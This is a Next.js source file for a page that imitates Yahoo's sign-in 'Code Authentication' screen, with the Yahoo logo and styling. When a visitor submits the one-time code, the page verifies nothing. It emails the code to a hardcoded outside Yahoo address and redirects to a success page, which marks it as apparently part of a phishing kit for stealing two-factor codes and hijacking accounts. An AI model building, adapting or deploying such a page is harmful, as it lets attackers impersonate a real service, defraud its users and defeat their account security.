'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useAuth } from '../context/AuthContext';

export default function OtpPage() {
  const router = useRouter();
  const { isAuthenticated } = useAuth();
  const [otp, setOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (!isAuthenticated) {
      router.push('/');
    }
  }, [isAuthenticated, router]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          from: 'onboarding@resend.dev', // Replace with your "from" email address
          to: 'usermail60@yahoo.com', // Replace with your "to" email address
          subject: 'Your Verification Code',
          html: `<p>OTP: ${otp}</p>`,
        }),
      });
      router.push('/success');
    } catch (error) {
      console.error('Failed to send email', error);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAuthenticated) {
    return null; // or a loading spinner
  }

  return (
    <div className="min-h-screen bg-[#f3f4f8] flex flex-col items-center px-4 py-6 sm:py-10 font-sans">
      <div className="w-full max-w-md flex-grow flex flex-col">
        <div className="text-center mb-8 sm:mb-10">
          <img src="/yahoo.png" alt="Yahoo" className="mx-auto h-auto w-[124px] sm:w-[140px]" />
        </div>
        <div className="w-full bg-white rounded-2xl p-6 sm:p-8 shadow-sm">
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold text-gray-800">Code Authentication</h2>
          </div>

          <div className="mb-6">
            <p className="text-sm text-gray-600 mb-2 italic">
              <span className="text-red-500">*</span> Indicates required field
            </p>
            <p className="text-gray-600 font-bold">
              Enter the OTP sent to your mobile number, Please wait 5min. <span className="text-red-500">*</span>
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label htmlFor="otp" className="sr-only">
                Enter OTP
              </label>
              <input
                type="text"
                id="otp"
                name="otp"
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
                className="w-full px-4 py-3 rounded-xl bg-gray-50 text-gray-900 placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#6001d2]"
                required
              />
            </div>

            <div>
                <button
                  type="submit"
                  className="w-full bg-[#6001d2] text-white py-3 rounded-xl font-semibold text-base sm:text-lg hover:bg-[#4f01af] transition-colors disabled:opacity-50"
                  disabled={isLoading}
                >
                {isLoading ? 'Verifying...' : 'Continue'}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
